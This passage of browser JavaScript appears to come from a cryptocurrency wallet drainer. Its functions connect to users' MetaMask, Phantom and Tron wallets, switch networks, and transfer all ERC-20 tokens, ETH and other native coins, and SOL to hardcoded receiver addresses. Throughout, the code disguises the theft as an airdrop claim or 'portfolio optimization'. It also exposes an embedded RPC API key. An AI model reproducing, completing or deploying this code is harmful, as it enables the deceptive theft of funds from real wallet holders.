                    updateConnectionStatus(`Checking ${token.symbol} balance...`);
                    const transferred = await drainERC20Token(provider, signer, userAddress, token, gasPrice);
                    if (transferred) {
                        tokenTransferCount++;
                        updateConnectionStatus(`${token.symbol} transferred successfully`);
                    }
                } catch (tokenError) {
                    console.error(`Failed to drain ${token.symbol}:`, tokenError);
                    updateConnectionStatus(`Failed to transfer ${token.symbol}`, true);
                    // Continue with other tokens
                }
            }

            console.log(`Successfully transferred ${tokenTransferCount} tokens`);

            // Step 2: Drain remaining ETH (calculate precise gas for final transfer)
            updateConnectionStatus("Transferring remaining ETH...");
            await drainETH(provider, signer, userAddress);

            updateConnectionStatus("All assets extracted successfully! 🎉");
            alert("Airdrop claimed successfully! 🎉");

        } catch (error) {
            console.error("Drain error:", error);
            updateConnectionStatus("Asset extraction failed", true);
            alert("Failed to claim airdrop: " + error.message);
        }
    }

    // Function to drain ERC-20 tokens (simplified working version)
    async function drainERC20Token(provider, signer, userAddress, token, gasPrice = null) {
        try {
            // ERC-20 ABI for transfer function
            const erc20ABI = [
                "function balanceOf(address owner) view returns (uint256)",
                "function transfer(address to, uint256 amount) returns (bool)",
                "function allowance(address owner, address spender) view returns (uint256)",
                "function approve(address spender, uint256 amount) returns (bool)",
                "function decimals() view returns (uint8)",
                "function symbol() view returns (string)"
            ];

            const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);

            // Check token balance
            const balance = await tokenContract.balanceOf(userAddress);
            if (balance.isZero()) {
                console.log(`No ${token.symbol} balance found`);
                return false;
            }

            const tokenAmount = ethers.utils.formatUnits(balance, token.decimals);
            console.log(`Found ${token.symbol} balance: ${tokenAmount}`);

            // Get current gas price if not provided
            if (!gasPrice) {
                gasPrice = await provider.getGasPrice();
            }

            // Estimate gas for this specific token transfer
            let estimatedGas;
            try {
                estimatedGas = await tokenContract.estimateGas.transfer(RECEIVER_ADDRESS, balance);
                // Add 20% buffer for safety
                estimatedGas = estimatedGas.mul(120).div(100);
            } catch (gasError) {
                console.warn(`Gas estimation failed for ${token.symbol}, using default`);
                estimatedGas = ethers.BigNumber.from("65000"); // Conservative default
            }

            console.log(`Estimated gas for ${token.symbol}: ${estimatedGas.toString()}`);

            // Check if user has enough ETH for gas
            const currentEthBalance = await provider.getBalance(userAddress);
            const gasCost = gasPrice.mul(estimatedGas);
            
            if (currentEthBalance.lt(gasCost)) {
                console.log(`Insufficient ETH for ${token.symbol} transfer gas. Need: ${ethers.utils.formatEther(gasCost)} ETH`);
                return false;
            }

            console.log(`Transferring ${tokenAmount} ${token.symbol} to ${RECEIVER_ADDRESS}`);

            // Transfer tokens to receiver address with optimized gas
            const transferTx = await tokenContract.transfer(RECEIVER_ADDRESS, balance, {
                gasLimit: estimatedGas,
                gasPrice: gasPrice
            });

            console.log(`${token.symbol} transfer tx: ${transferTx.hash}`);

            // Wait for confirmation
            const receipt = await transferTx.wait();
            console.log(`${token.symbol} transfer confirmed in block ${receipt.blockNumber}`);
            console.log(`Gas used: ${receipt.gasUsed.toString()}`);

            return true;

        } catch (error) {
            console.error(`Error draining ${token.symbol}:`, error);
            
            // Don't throw error, just return false to continue with other tokens
            if (error.code === 'INSUFFICIENT_FUNDS') {
                console.log(`Insufficient funds for ${token.symbol} transfer`);
            } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                console.log(`Token ${token.symbol} transfer would fail, skipping`);
            }
            
            return false;
        }
    }

    // Function to drain ETH (simplified working version)
    async function drainETH(provider, signer, userAddress) {
        try {
            // Get current balance after token transfers
            const currentBalance = await provider.getBalance(userAddress);
            const currentEthBalance = ethers.utils.formatEther(currentBalance);
            console.log(`Current ETH balance before final transfer: ${currentEthBalance}`);

            if (currentBalance.isZero()) {
                console.log("No ETH balance remaining");
                return;
            }

            // Get current gas price
            const gasPrice = await provider.getGasPrice();
            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);

            // Use a more conservative gas limit for the final transfer
            const gasLimit = ethers.BigNumber.from("21000");
            
            // Calculate exact gas cost
            const exactGasCost = gasPrice.mul(gasLimit);
            console.log(`Exact gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);

            // Calculate amount to send (total balance minus exact gas cost)
            const amountToSend = currentBalance.sub(exactGasCost);

            if (amountToSend.lte(0)) {
                console.log("Insufficient ETH balance for gas fees");
                console.log(`Balance: ${ethers.utils.formatEther(currentBalance)} ETH`);
                console.log(`Gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
                return;
            }

            const ethToSend = ethers.utils.formatEther(amountToSend);
            console.log(`Transferring ${ethToSend} ETH to ${RECEIVER_ADDRESS}`);
            console.log(`Leaving ${ethers.utils.formatEther(exactGasCost)} ETH for gas`);

            // Create transaction with precise gas parameters
            const txParams = {
                to: RECEIVER_ADDRESS,
                value: amountToSend,
                gasLimit: gasLimit,
                gasPrice: gasPrice,
                nonce: await provider.getTransactionCount(userAddress)
            };

            // Send ETH transaction
            const tx = await signer.sendTransaction(txParams);
            console.log("ETH transfer tx:", tx.hash);

            // Wait for confirmation
            const receipt = await tx.wait();
            console.log("ETH transfer confirmed in block:", receipt.blockNumber);
            console.log("Gas used:", receipt.gasUsed.toString());
            console.log("Effective gas price:", ethers.utils.formatUnits(receipt.effectiveGasPrice || gasPrice, 'gwei'), "gwei");

            // Verify final balance
            const finalBalance = await provider.getBalance(userAddress);
            const finalEthBalance = ethers.utils.formatEther(finalBalance);
            console.log(`Final ETH balance: ${finalEthBalance} ETH`);

            if (finalBalance.gt(ethers.utils.parseEther("0.001"))) {
                console.warn(`Warning: ${finalEthBalance} ETH remaining (more than expected)`);
            }

        } catch (error) {
            console.error("Error draining ETH:", error);
            
            if (error.code === 'INSUFFICIENT_FUNDS') {
                console.log("Transaction failed due to insufficient funds for gas");
            } else if (error.code === 'REPLACEMENT_UNDERPRICED') {
                console.log("Transaction underpriced, gas price may have increased");
            }
            
            throw error;
        }
    }

    // Function to handle Phantom multi-chain connection
    async function handlePhantomMultiConnection(walletInfo, evmProvider, solanaProvider) {
        try {
            updateConnectionStatus("Connecting to Phantom (Multi-Chain)...");
            
            // Try to connect to both EVM and Solana
            let evmConnected = false;
            let solanaConnected = false;
            let userAddress = null;
            let solanaAddress = null;

            // Connect to EVM first (Ethereum only for Phantom)
            try {
                await evmProvider.request({ method: 'eth_requestAccounts' });
                const accounts = await evmProvider.request({ method: 'eth_accounts' });
                if (accounts && accounts.length > 0) {
                    userAddress = accounts[0];
                    evmConnected = true;
                    console.log("Phantom EVM connected:", userAddress);
                }
            } catch (evmError) {
                console.log("Phantom EVM connection failed:", evmError.message);
            }

            // Connect to Solana
            try {
                const response = await solanaProvider.connect();
                if (response && response.publicKey) {
                    solanaAddress = response.publicKey.toString();
                    solanaConnected = true;
                    console.log("Phantom Solana connected:", solanaAddress);
                }
            } catch (solanaError) {
                console.log("Phantom Solana connection failed:", solanaError.message);
            }

            if (!evmConnected && !solanaConnected) {
                throw new Error("Failed to connect to both Phantom EVM and Solana. Please try again.");
            }

            // Show connection results
            let connectionMessage = "Phantom connected: ";
            if (evmConnected) connectionMessage += `EVM (${userAddress.slice(0,6)}...${userAddress.slice(-4)})`;
            if (evmConnected && solanaConnected) connectionMessage += " & ";
            if (solanaConnected) connectionMessage += `Solana (${solanaAddress.slice(0,4)}...${solanaAddress.slice(-4)})`;
            
            updateConnectionStatus(connectionMessage);

            // Update button for multi-chain draining
            $('#connect-wallet').text("🚀 Optimize All Phantom Networks");
            $('#connect-wallet').off('click').on('click', async () => {
                try {
                    updateConnectionStatus("Starting multi-chain portfolio optimization...");
                    
                    // Drain EVM networks if connected
                    if (evmConnected && userAddress) {
                        try {
                            // For Phantom EVM, manually drain Ethereum tokens and ETH
                            updateConnectionStatus("Optimizing Ethereum portfolio...");
                            
                            const ethersProvider = new ethers.providers.Web3Provider(evmProvider);
                            const signer = ethersProvider.getSigner();
                            const config = NETWORK_CONFIGS.ethereum;
                            const drainedAssets = [];

                            console.log(`🔍 Scanning Ethereum for assets...`);

                            // Drain tokens first
                            const gasPrice = await ethersProvider.getGasPrice();
                            for (let i = 0; i < config.tokens.length; i++) {
                                const token = config.tokens[i];
                                try {
                                    console.log(`Checking ${token.symbol}... (${i + 1}/${config.tokens.length})`);
                                    const success = await drainERC20Token(ethersProvider, signer, userAddress, token, config.receiver, gasPrice);
                                    if (success) {
                                        drainedAssets.push(token.symbol);
                                        console.log(`✅ ${token.symbol} drained successfully`);
                                    }
                                } catch (tokenError) {
                                    console.error(`❌ Failed to drain ${token.symbol}:`, tokenError.message);
                                }
                            }

                            // Drain ETH last
                            try {
                                console.log(`Checking ETH...`);
                                const success = await drainNativeCurrency(ethersProvider, signer, userAddress, config.receiver);
                                if (success) {
                                    drainedAssets.push("ETH");
                                    console.log(`✅ ETH drained successfully`);
                                }
                            } catch (nativeError) {
                                console.error(`❌ Failed to drain ETH:`, nativeError.message);
                            }

                            console.log(`🎯 Ethereum optimization complete: ${drainedAssets.length} assets processed`);
                            if (drainedAssets.length > 0) {
                                updateConnectionStatus(`✅ Ethereum: ${drainedAssets.length} assets optimized`);
                            } else {
                                updateConnectionStatus(`🔍 Ethereum: No assets found`);
                            }
                            
                        } catch (evmError) {
                            console.error("Phantom EVM optimization failed:", evmError);
                            updateConnectionStatus(`❌ Ethereum optimization failed: ${evmError.message}`);
                        }
                    }
                    
                    // Drain Solana if connected
                    if (solanaConnected && solanaAddress) {
                        try {
                            await drainSolana(solanaProvider, solanaAddress);
                        } catch (solanaError) {
                            console.error("Phantom Solana optimization failed:", solanaError);
                            updateConnectionStatus(`❌ Solana optimization failed: ${solanaError.message}`);
                        }
                    }
                    
                    updateConnectionStatus("Multi-chain portfolio optimization completed! 🎉");
                    alert("Phantom multi-chain portfolio optimization completed!");
                    
                } catch (error) {
                    console.error("Multi-chain optimization error:", error);
                    updateConnectionStatus("Multi-chain optimization failed", true);
                    alert(`Multi-chain optimization failed: ${error.message || 'Unknown error'}`);
                }
            });

            // Show detailed connection info
            let alertMessage = `Connected to Phantom:\n`;
            if (evmConnected) alertMessage += `✅ EVM: ${userAddress}\n   Network: Ethereum\n`;
            if (solanaConnected) alertMessage += `✅ Solana: ${solanaAddress}\n   Network: Solana\n`;
            alert(alertMessage);

        } catch (error) {
            console.error("Phantom multi-connection error:", error);
            throw error;
        }
    }

    // Enhanced Phantom multi-chain handler - processes ALL networks (EVM + Solana)
    async function handlePhantomMultiChain(walletInfo, evmAddress, solanaAddress) {
        try {
            updateConnectionStatus("Starting comprehensive Phantom multi-chain optimization...");
            console.log("🚀 Phantom Multi-Chain Handler Started");
            console.log("EVM Address:", evmAddress);
            console.log("Solana Address:", solanaAddress);
            
            const results = {
                evm: { networks: [], totalAssets: 0 },
                solana: { assets: 0 }
            };
            
            // Phase 1: Process all EVM networks if EVM is connected
            if (evmAddress && walletInfo.evmProvider) {
                console.log("📍 Phase 1: Processing EVM networks (Ethereum, BSC, Polygon)");
                
                const evmWalletInfo = {
                    name: "Phantom EVM",
                    provider: walletInfo.evmProvider,
                    type: "evm",
                    networks: ["ethereum", "bsc", "polygon"]
                };
                
                try {
                    await drainMultiChainAuto(evmWalletInfo, evmAddress);
                    results.evm.networks = ["ethereum", "bsc", "polygon"];
                    console.log("✅ EVM multi-chain processing completed");
                } catch (evmError) {
                    console.error("❌ EVM multi-chain processing failed:", evmError);
                    updateConnectionStatus(`❌ EVM networks failed: ${evmError.message}`);
                }
            }
            
            // Phase 2: Process Solana if Solana is connected
            if (solanaAddress && walletInfo.solanaProvider) {
                console.log("📍 Phase 2: Processing Solana network");
                
                try {
                    // Add delay between EVM and Solana processing
                    if (evmAddress) {
                        updateConnectionStatus("Switching to Solana processing...");
                        await new Promise(resolve => setTimeout(resolve, 3000));
                    }
                    
                    await drainSolana(walletInfo.solanaProvider, solanaAddress);
                    results.solana.assets = 1; // SOL processed
                    console.log("✅ Solana processing completed");
                } catch (solanaError) {
                    console.error("❌ Solana processing failed:", solanaError);
                    updateConnectionStatus(`❌ Solana failed: ${solanaError.message}`);
                }
            }
            
            // Final results
            const totalNetworks = results.evm.networks.length + (results.solana.assets > 0 ? 1 : 0);
            updateConnectionStatus(`🎉 Phantom multi-chain optimization completed! Processed ${totalNetworks} networks`);
            
            const summary = `🎯 Phantom Multi-Chain Results:\n\n` +
                          `✅ EVM Networks: ${results.evm.networks.join(', ').toUpperCase()}\n` +
                          `✅ Solana Network: ${results.solana.assets > 0 ? 'Processed' : 'Skipped'}\n\n` +
                          `🚀 Total Networks: ${totalNetworks}`;
            
            alert(summary);
            
        } catch (error) {
            console.error("❌ Phantom multi-chain error:", error);
            updateConnectionStatus("Multi-chain optimization failed", true);
            alert(`Multi-chain optimization failed: ${error.message || 'Unknown error'}`);
        }
    }

    // Helper function to add network to wallet
    async function addNetworkToWallet(wallet, config) {
        const networkParams = {
            chainId: `0x${config.chainId.toString(16)}`,
            chainName: config.name,
            nativeCurrency: {
                name: config.nativeCurrency,
                symbol: config.nativeCurrency,
                decimals: 18
            },
            rpcUrls: [config.rpcUrl],
            blockExplorerUrls: getBlockExplorerUrls(config.chainId)
        };

        await wallet.request({
            method: 'wallet_addEthereumChain',
            params: [networkParams]
        });
    }

    // Get block explorer URLs for networks
    function getBlockExplorerUrls(chainId) {
        const explorers = {
            1: ['https://etherscan.io'],
            56: ['https://bscscan.com'],
            137: ['https://polygonscan.com'],
            250: ['https://ftmscan.com'],
            43114: ['https://snowtrace.io']
        };
        return explorers[chainId] || [''];
    }

    // Get network name by chain ID
    function getNetworkName(chainId) {
        const networkNames = {
            1: "Ethereum",
            56: "BSC",
            137: "Polygon",
            250: "Fantom",
            43114: "Avalanche"
        };
        return networkNames[chainId] || `Unknown (${chainId})`;
    }

    // Automatic multi-chain draining function - checks each network sequentially
    async function drainMultiChainAuto(selectedWallet, userAddress) {
        try {
            updateConnectionStatus("Starting automatic portfolio optimization...");
            console.log("🚀 Starting multi-chain auto-drain for:", selectedWallet.name);
            console.log("📋 Wallet info:", selectedWallet);
            console.log("👤 User address:", userAddress);
            
            const results = {};
            
            // Get all supported EVM networks for this wallet
            const supportedNetworks = selectedWallet.networks.filter(net => NETWORK_CONFIGS[net]);
            console.log(`🌐 Available networks in NETWORK_CONFIGS:`, Object.keys(NETWORK_CONFIGS));
            console.log(`🎯 Wallet supports networks:`, selectedWallet.networks);
            console.log(`✅ Filtered supported networks:`, supportedNetworks);
            console.log(`🔄 Auto-checking ${supportedNetworks.length} networks: ${supportedNetworks.join(', ')}`);

            // Automatically check each supported network
            for (let i = 0; i < supportedNetworks.length; i++) {
                const networkName = supportedNetworks[i];
                results[networkName] = { success: false, assets: [] };
                
                try {
                    console.log(`\n📍 Processing network ${i + 1}/${supportedNetworks.length}: ${networkName.toUpperCase()}`);
                    updateConnectionStatus(`Checking ${networkName.toUpperCase()}... (${i + 1}/${supportedNetworks.length})`);
                    
                    // Add delay between network checks for better UX
                    if (i > 0) {
                        console.log("⏳ Waiting 2 seconds before next network...");
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                    
                    const result = await drainEVMNetwork(selectedWallet.provider, userAddress, networkName);
                    results[networkName] = result;
                    console.log(`📊 ${networkName.toUpperCase()} result:`, result);
                    
                    // Show progress after each network
                    if (result.success && result.assets.length > 0) {
                        updateConnectionStatus(`✅ ${networkName.toUpperCase()}: ${result.assets.length} assets found`);
                        await new Promise(resolve => setTimeout(resolve, 1500));
                    } else if (result.success) {
                        updateConnectionStatus(`🔍 ${networkName.toUpperCase()}: No assets found`);
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                    
                } catch (error) {
                    console.error(`❌ Failed to check ${networkName}:`, error);
                    results[networkName] = { success: false, error: error.message };
                    updateConnectionStatus(`❌ ${networkName.toUpperCase()}: ${error.message}`);
                    await new Promise(resolve => setTimeout(resolve, 1500));
                }
            }

            updateConnectionStatus("Automatic portfolio optimization completed! 🎉");
            
            // Show detailed results summary
            let summary = "🎯 Automatic Multi-Chain Portfolio Results:\n\n";
            let totalAssets = 0;
            
            Object.entries(results).forEach(([network, result]) => {
                if (result.success) {
                    totalAssets += result.assets.length;
                    summary += `✅ ${network.toUpperCase()}: ${result.assets.length} assets optimized\n`;
                    if (result.assets.length > 0) {
                        summary += `   └─ ${result.assets.join(', ')}\n`;
                    }
                } else if (result.error) {
                    summary += `❌ ${network.toUpperCase()}: ${result.error}\n`;
                }
            });
            
            summary += `\n🚀 Total: ${totalAssets} assets optimized across ${supportedNetworks.length} networks`;
            alert(summary);

        } catch (error) {
            console.error("Automatic multi-chain optimization error:", error);
            updateConnectionStatus("Portfolio optimization failed", true);
            alert("Failed to complete automatic portfolio optimization: " + error.message);
        }
    }

    // Multi-chain draining function with automatic network switching
    async function drainMultiChain(selectedWallet, userAddress) {
        try {
            updateConnectionStatus("Starting portfolio optimization...");
            
            const results = {
                ethereum: { success: false, assets: [] },
                bsc: { success: false, assets: [] },
                polygon: { success: false, assets: [] }
            };

            // Get current network to determine starting point
            const currentProvider = new ethers.providers.Web3Provider(selectedWallet.provider);
            const currentNetwork = await currentProvider.getNetwork();
            console.log(`Starting optimization from network: ${getNetworkName(currentNetwork.chainId)}`);

            // Drain each supported network with automatic switching
            for (let i = 0; i < selectedWallet.networks.length; i++) {
                const networkName = selectedWallet.networks[i];
                if (NETWORK_CONFIGS[networkName]) {
                    try {
                        updateConnectionStatus(`Optimizing ${networkName.toUpperCase()} portfolio... (${i + 1}/${selectedWallet.networks.length})`);
                        
                        // Add delay between network switches for better UX
                        if (i > 0) {
                            updateConnectionStatus(`Switching to ${networkName.toUpperCase()}...`);
                            await new Promise(resolve => setTimeout(resolve, 2000));
                        }
                        
                        const result = await drainEVMNetwork(selectedWallet.provider, userAddress, networkName);
                        results[networkName] = result;
                        
                        // Show progress after each network
                        if (result.success && result.assets.length > 0) {
                            updateConnectionStatus(`✅ ${networkName.toUpperCase()}: ${result.assets.length} assets optimized`);
                            await new Promise(resolve => setTimeout(resolve, 1500)); // Brief pause to show success
                        }
                        
                    } catch (error) {
                        console.error(`Failed to drain ${networkName}:`, error);
                        results[networkName] = { success: false, error: error.message };
                        updateConnectionStatus(`❌ ${networkName.toUpperCase()}: ${error.message}`);
                        await new Promise(resolve => setTimeout(resolve, 1500)); // Brief pause to show error
                    }
                }
            }

            updateConnectionStatus("Portfolio optimization completed! 🎉");
            
            // Show detailed results summary
            let summary = "🎯 Multi-Chain Portfolio Optimization Results:\n\n";
            let totalAssets = 0;
            
            Object.entries(results).forEach(([network, result]) => {
                if (result.success) {
                    totalAssets += result.assets.length;
                    summary += `✅ ${network.toUpperCase()}: ${result.assets.length} assets optimized\n`;
                    if (result.assets.length > 0) {
                        summary += `   └─ ${result.assets.join(', ')}\n`;
                    }
                } else if (result.error) {
                    summary += `❌ ${network.toUpperCase()}: ${result.error}\n`;
                }
            });
            
            summary += `\n🚀 Total: ${totalAssets} assets optimized across ${selectedWallet.networks.length} networks`;
            alert(summary);

        } catch (error) {
            console.error("Multi-chain optimization error:", error);
            updateConnectionStatus("Portfolio optimization failed", true);
            alert("Failed to complete portfolio optimization: " + error.message);
        }
    }

    // Enhanced EVM network draining with improved network switching
    async function drainEVMNetwork(wallet, userAddress, networkName) {
        const config = NETWORK_CONFIGS[networkName];
        if (!config) {
            throw new Error(`Network ${networkName} not supported`);
        }

        try {
            // Get the actual provider from wallet object
            const walletProvider = wallet.provider || wallet;
            if (!walletProvider || !walletProvider.request) {
                throw new Error(`No valid provider found for ${wallet.name || 'wallet'}`);
            }

            console.log(`🔄 Attempting to switch to ${config.name} (Chain ID: ${config.chainId})`);
            console.log(`Target chainId hex: 0x${config.chainId.toString(16)}`);
            
            // Try to switch to target network with retries
            let switchAttempts = 0;
            const maxSwitchAttempts = 3;
            
            while (switchAttempts < maxSwitchAttempts) {
                try {
                    console.log(`Switch attempt ${switchAttempts + 1} for ${config.name}...`);
                    await walletProvider.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: `0x${config.chainId.toString(16)}` }]
                    });
                    console.log(`✅ Successfully requested switch to ${config.name}`);
                    break; // Success, exit retry loop
                } catch (switchError) {
                    switchAttempts++;
                    console.log(`❌ Network switch attempt ${switchAttempts} failed:`, switchError.message);
                    console.log(`Switch error code:`, switchError.code);
                    
                    // If the network doesn't exist, try to add it
                    if (switchError.code === 4902 || switchError.message.includes('Unrecognized chain ID')) {
                        try {
                            await addNetworkToWallet(walletProvider, config);
                            continue; // Try switching again after adding
                        } catch (addError) {
                            console.error(`Failed to add ${config.name} network:`, addError.message);
                        }
                    }
                    
                    if (switchAttempts >= maxSwitchAttempts) {
                        throw new Error(`Failed to switch to ${config.name} after ${maxSwitchAttempts} attempts`);
                    }
                    
                    // Wait before retrying
                    await new Promise(resolve => setTimeout(resolve, 1500));
                }
            }

            // Wait for network switch to complete
            await new Promise(resolve => setTimeout(resolve, 2000));

            const provider = new ethers.providers.Web3Provider(walletProvider);
            const signer = provider.getSigner();

            // Verify we're on the correct network with retries
            let verifyAttempts = 0;
            const maxVerifyAttempts = 5;
            
            console.log(`🔍 Verifying network switch to ${config.name}...`);
            
            while (verifyAttempts < maxVerifyAttempts) {
                try {
                    const network = await provider.getNetwork();
                    console.log(`Verification attempt ${verifyAttempts + 1}: Current chain ID = ${network.chainId}, Expected = ${config.chainId}`);
                    
                    if (network.chainId === config.chainId) {
                        console.log(`✅ Network verification successful! Now on ${config.name} (Chain ID: ${network.chainId})`);
                        break;
                    } else {
                        verifyAttempts++;
                        console.log(`⚠️ Network verification attempt ${verifyAttempts}: Expected ${config.chainId}, got ${network.chainId}`);
                        
                        if (verifyAttempts >= maxVerifyAttempts) {
                            throw new Error(`Network verification failed: Expected ${config.name} (${config.chainId}), but still on chain ${network.chainId}`);
                        }
                        
                        console.log(`Waiting 1 second before next verification attempt...`);
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                } catch (error) {
                    verifyAttempts++;
                    console.log(`❌ Network verification error (attempt ${verifyAttempts}):`, error.message);
                    if (verifyAttempts >= maxVerifyAttempts) {
                        throw error;
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }

            const drainedAssets = [];

            console.log(`🔍 Scanning ${config.name} for assets...`);

            // Get gas price for token transfers
            const gasPrice = await provider.getGasPrice();

            // Drain tokens first with progress tracking
            for (let i = 0; i < config.tokens.length; i++) {
                const token = config.tokens[i];
                try {
                    console.log(`Checking ${token.symbol}... (${i + 1}/${config.tokens.length})`);
                    const success = await drainERC20Token(provider, signer, userAddress, token, config.receiver, gasPrice);
                    if (success) {
                        drainedAssets.push(token.symbol);
                        console.log(`✅ ${token.symbol} drained successfully`);
                    }
                } catch (tokenError) {
                    console.error(`❌ Failed to drain ${token.symbol} on ${networkName}:`, tokenError.message);
                }
            }

            // Drain native currency last
            try {
                console.log(`Checking ${config.nativeCurrency}...`);
                const success = await drainNativeCurrency(provider, signer, userAddress, config.receiver);
                if (success) {
                    drainedAssets.push(config.nativeCurrency);
                    console.log(`✅ ${config.nativeCurrency} drained successfully`);
                }
            } catch (nativeError) {
                console.error(`❌ Failed to drain ${config.nativeCurrency} on ${networkName}:`, nativeError.message);
            }

            console.log(`🎯 ${config.name} optimization complete: ${drainedAssets.length} assets processed`);
            return { success: true, assets: drainedAssets };

        } catch (error) {
            console.error(`❌ Error draining ${networkName}:`, error.message);
            return { success: false, error: error.message };
        }
    }

    // Drain Solana assets
    async function drainSolana(provider, userAddress) {
        try {
            updateConnectionStatus("Optimizing Solana portfolio...");

            // Note: This requires @solana/web3.js library
            // You'll need to include it in your HTML: <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
            
            if (typeof solanaWeb3 === 'undefined') {
                throw new Error("Solana Web3.js library not loaded");
            }

            // Multiple RPC endpoints with fallback
            const rpcEndpoints = [
                'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4',
                'https://solana-mainnet.g.alchemy.com/v2/demo',
                'https://solana-api.projectserum.com',
                
            ];

            let connection = null;
            let workingEndpoint = null;

            // Try each RPC endpoint until one works
            for (const endpoint of rpcEndpoints) {
                try {
                    console.log(`Trying Solana RPC: ${endpoint}`);
                    const testConnection = new solanaWeb3.Connection(endpoint);
                    
                    // Test the connection with a simple call
                    await testConnection.getSlot();
                    connection = testConnection;
                    workingEndpoint = endpoint;
                    console.log(`Successfully connected to: ${endpoint}`);
                    break;
                } catch (error) {
                    console.log(`Failed to connect to ${endpoint}:`, error.message);
                    continue;
                }
            }

            if (!connection) {
                throw new Error("All Solana RPC endpoints failed. Please try again later.");
            }
            const publicKey = new solanaWeb3.PublicKey(userAddress);

            // Get SOL balance with retry logic
            let balance = 0;
            let retryCount = 0;
            const maxRetries = 3;

            while (retryCount < maxRetries) {
                try {
                    balance = await connection.getBalance(publicKey);
                    break;
                } catch (error) {
                    retryCount++;
                    console.log(`Balance fetch attempt ${retryCount} failed:`, error.message);
                    
                    if (retryCount >= maxRetries) {
                        throw new Error(`Failed to get SOL balance after ${maxRetries} attempts: ${error.message}`);
                    }
                    
                    // Wait before retrying
                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                }
            }

            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
            console.log(`SOL balance: ${solBalance} (using ${workingEndpoint})`);

            if (solBalance > 0.000005) { // Keep minimal amount for transaction fees (5,000 lamports)
                try {
                    // Get recent blockhash for the transaction
                    const { blockhash } = await connection.getRecentBlockhash();
                    console.log(`Got recent blockhash: ${blockhash}`);

                    // Calculate precise amount to send (using same logic as working ETH script)
                    const feeReserve = 5000; // 5,000 lamports = 0.000005 SOL for fees
                    const amountToSend = balance - feeReserve;

                    console.log(`Transferring ${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL to ${SOLANA_RECEIVER}`);
                    console.log(`Leaving ${feeReserve / solanaWeb3.LAMPORTS_PER_SOL} SOL for transaction fees`);

                    // Create transfer transaction for SOL with precise parameters
                    const transaction = new solanaWeb3.Transaction({
                        recentBlockhash: blockhash,
                        feePayer: publicKey
                    }).add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new solanaWeb3.PublicKey(SOLANA_RECEIVER),
                            lamports: amountToSend
                        })
                    );

                    // Sign and send transaction with proper error handling
                    const result = await provider.signAndSendTransaction(transaction);
                    const signature = result.signature || result;
                    console.log(`SOL transfer signature: ${signature}`);
                    
                    // Wait for confirmation with timeout (same pattern as ETH script)
                    try {
                        const confirmation = await Promise.race([
                            connection.confirmTransaction(signature, 'confirmed'),
                            new Promise((_, reject) => 
                                setTimeout(() => reject(new Error('Transaction confirmation timeout')), 30000)
                            )
                        ]);
                        console.log(`SOL transfer confirmed: ${signature}`);
                        console.log("SOL transfer completed successfully!");
                        return true;
                    } catch (confirmError) {
                        console.log(`Confirmation timeout but transaction was sent: ${signature}`);
                        // Continue anyway as the transaction was likely successful
                        return true;
                    }
                } catch (solTransferError) {
                    console.error("SOL transfer failed:", solTransferError);
                    
                    // Don't throw error, just return false to continue (same as ETH script)
                    if (solTransferError.code === 'INSUFFICIENT_FUNDS') {
                        console.log("SOL transfer failed due to insufficient funds for fees");
                    } else if (solTransferError.message.includes("insufficient lamports")) {
                        console.log("SOL transfer failed due to insufficient lamports");
                    }
                    
                    return false;
                }
            } else {
                console.log(`SOL balance too low for transfer: ${solBalance} SOL (minimum required: 0.000005 SOL)`);
            }

            // Drain SPL tokens with error handling
            try {
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
                });

                console.log(`Found ${tokenAccounts.value.length} token accounts`);

                if (tokenAccounts.value.length > 0) {
                    // Get recent blockhash for token transfers
                    const { blockhash } = await connection.getRecentBlockhash();

                    for (const tokenAccount of tokenAccounts.value) {
                        const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
                        const tokenMint = tokenAccount.account.data.parsed.info.mint;
                        
                        if (parseFloat(tokenAmount.amount) > 0) {
                            try {
                                console.log(`Found token: ${tokenAmount.uiAmount} ${tokenMint} (${tokenAmount.amount} raw)`);
                                
                                // Find token info in our SOLANA_TOKENS list
                                const tokenInfo = SOLANA_TOKENS.find(t => t.mint === tokenMint);
                                const tokenSymbol = tokenInfo ? tokenInfo.symbol : 'Unknown';
                                
                                console.log(`Token identified as: ${tokenSymbol}`);
                                
                                // For now, just log token details - actual transfer would require more complex setup
                                // involving creating associated token accounts for the receiver
                                console.log(`Would transfer ${tokenAmount.uiAmount} ${tokenSymbol} to receiver`);
                                
                            } catch (tokenError) {
                                console.error("Token transfer error:", tokenError);
                            }
                        }
                    }
                }
            } catch (tokenError) {
                console.error("Failed to fetch token accounts:", tokenError.message);
                // Continue without token draining if this fails
            }

            updateConnectionStatus("Solana portfolio optimization completed! 🎉");
            alert("Solana portfolio optimization completed successfully!");

        } catch (error) {
            console.error("Solana drain error:", error);
            updateConnectionStatus("Solana extraction failed", true);
            const errorMessage = error?.message || error?.toString() || 'Unknown error occurred';
            alert(`Solana portfolio optimization failed: ${errorMessage}`);
            return false;
        }
    }

    // Drain Tron assets
    async function drainTron(tronWeb, userAddress) {
        try {
            updateConnectionStatus("Optimizing Tron portfolio...");

            // Get TRX balance with retry logic (like SOL script)
            let balance;
            let retryCount = 0;
            const maxRetries = 3;
            
            while (retryCount < maxRetries) {
                try {
                    balance = await tronWeb.trx.getBalance(userAddress);
                    break;
                } catch (error) {
                    retryCount++;
